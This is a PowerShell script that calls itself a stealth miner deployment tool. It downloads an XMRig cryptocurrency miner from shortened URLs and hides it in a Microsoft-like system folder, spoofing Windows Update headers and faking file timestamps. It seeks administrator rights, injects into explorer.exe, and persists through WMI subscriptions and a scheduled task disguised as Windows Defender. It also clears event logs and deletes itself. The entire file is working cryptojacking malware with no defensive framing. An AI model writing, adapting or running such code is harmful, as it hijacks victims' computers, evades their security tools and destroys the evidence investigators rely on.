<#
.NOTES
  - Hybrid stealth miner deployment script (Verified Fix)
  - Implements: Process injection, WMI/scheduled task persistence, anti-forensics
#>

### === CONFIGURATION ===
$zipUrl = "http://tiny.cc/thmg001"
$payloadUrl = "http://tiny.cc/arfg001"
$minerHome = "$env:ProgramData\Microsoft\Windows\EDP"
$minerBinary = "edpnotify.exe"

### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
# if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
#     (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
#     (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
#     exit
# }

### === PHASE 2: ELEVATION MECHANISM ===
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $stagePath = "$env:TEMP\dmcshell.ps1"
    
    try {
        # Clean existing files
        if (Test-Path $stagePath) { Remove-Item $stagePath -Force }
        
        # Copy with retry logic
        1..3 | ForEach-Object {
            try {
                Copy-Item $PSCommandPath $stagePath -Force -ErrorAction Stop
                break
            }
            catch {
                if ($_ -eq 3) { throw }
                Start-Sleep -Seconds 2
            }
        }

        # Launch elevated instance
        $proc = Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$stagePath`"" -Verb RunAs -WindowStyle Hidden
        if ($proc) {
            wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            exit
        }
    }
    catch {
        Write-Warning "Elevation failed: $($_.Exception.Message)"
        exit
    }
}

### === PHASE 3: BINARY DEPLOYMENT ===
try {
    # Clean and create directory
    if (Test-Path $minerHome) { Remove-Item $minerHome -Recurse -Force }
    New-Item -Path $minerHome -ItemType Directory -Force | Out-Null
    attrib +h +s $minerHome

    # Method 1: ZIP Download
    $zipPath = "$minerHome\windows_update.zip"
    Invoke-WebRequest -Uri $zipUrl -Headers @{
        "User-Agent" = "Microsoft-Delivery-Optimization/10.0"
        "X-Requested-With" = "Windows Update Manager"
    } -OutFile $zipPath

    Expand-Archive -Path $zipPath -DestinationPath $minerHome -Force
    Remove-Item -Path $zipPath -Force

    # Verify extraction
    if (-not ($extractedExe = Get-ChildItem -Path $minerHome -Filter "xmrig*.exe" -Recurse | Select-Object -First 1)) {
        throw "No binary found in ZIP"
    }
    Move-Item -Path $extractedExe.FullName -Destination "$minerHome\$minerBinary" -Force
}
catch {
    # Method 2: Base64 Fallback
    try {
        $payloadPath = "$minerHome\payload.txt"
        Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -ErrorAction Stop
        $base64Payload = Get-Content -Path $payloadPath -Raw
        [IO.File]::WriteAllBytes("$minerHome\$minerBinary", [Convert]::FromBase64String($base64Payload))
        Remove-Item -Path $payloadPath -Force
    }
    catch {
        Write-Host "All deployment methods failed" -ForegroundColor Red
        exit
    }
}

### === PHASE 4: FILE CONFIGURATION ===
if (Test-Path "$minerHome\$minerBinary") {
    Start-Sleep -Seconds 1  # Allow file system sync
    attrib +h +s "$minerHome\$minerBinary"
    $sysFile = Get-Item "$env:SystemRoot\System32\drivers\etc\hosts" -Force
    $minerFile = Get-Item "$minerHome\$minerBinary" -Force
    $minerFile.LastWriteTime = $sysFile.LastWriteTime
}
else {
    Write-Error "Critical failure: Miner binary not deployed"
    exit
}

### === PHASE 5: PROCESS INJECTION ===
try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Injector {
        [DllImport("kernel32.dll")] 
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", ExactSpelling=true, SetLastError=true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
"@ -ErrorAction Stop

    $targetProc = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
    $loadLib = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
    $alloc = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint]"$minerHome\$minerBinary".Length + 1, 0x3000, 0x40)
    [Injector]::WriteProcessMemory($hProcess, $alloc, [Text.Encoding]::ASCII.GetBytes("$minerHome\$minerBinary"), [uint]"$minerHome\$minerBinary".Length + 1, [ref][UIntPtr]::Zero)
    [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [IntPtr]::Zero)
}
catch {
    Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
}

### === PHASE 6: PERSISTENCE MECHANISMS ===
# Clean existing WMI entries
Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
    Where-Object {$_.Name -like "SysHealth_*"} | 
    Remove-WmiObject -ErrorAction SilentlyContinue

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
    Where-Object {$_.Name -like "SysMaint_*"} | 
    Remove-WmiObject -ErrorAction SilentlyContinue

# WMI Subscription
try {
    $wmiFilterQuery = @"
    SELECT * FROM __InstanceModificationEvent WITHIN 60 
    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
    AND TargetInstance.SystemUpTime >= 300
"@

    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = "SysHealth_$((Get-Date).Ticks)"
        EventNamespace = 'root\cimv2'  # Critical fix
        Query = $wmiFilterQuery
        QueryLanguage = "WQL"
    }

    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = "SysMaint_$((Get-Date).Ticks)"
        CommandLineTemplate = "`"$minerHome\$minerBinary`" --donate-level=0"
    }

    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $filter.__PATH
        Consumer = $consumer.__PATH
    }
}
catch {
    Write-Warning "WMI persistence failed: $($_.Exception.Message)"
}

# Scheduled Task
try {
    $taskSettings = New-ScheduledTaskSettingsSet `
        -StartWhenAvailable `
        -DontStopIfGoingOnBatteries `
        -MultipleInstances IgnoreNew

    $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
    Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" `
        -Trigger $trigger `
        -Action (New-ScheduledTaskAction -Execute "$minerHome\$minerBinary" -Argument "--donate-level=0") `
        -Settings $taskSettings `
        -Force | Out-Null
}
catch {
    Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
}

### === PHASE 7: CLEANUP & VERIFICATION ===
# Process watchdog
if (-not (Get-Process -Name (Get-Item $minerHome\$minerBinary).BaseName -ErrorAction SilentlyContinue)) {
    Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
}

# Log cleanup
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
wevtutil cl "System" 2>$null

# Self-cleanup
if (-not $PSCommandPath.Contains("ProgramData")) {
    Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
}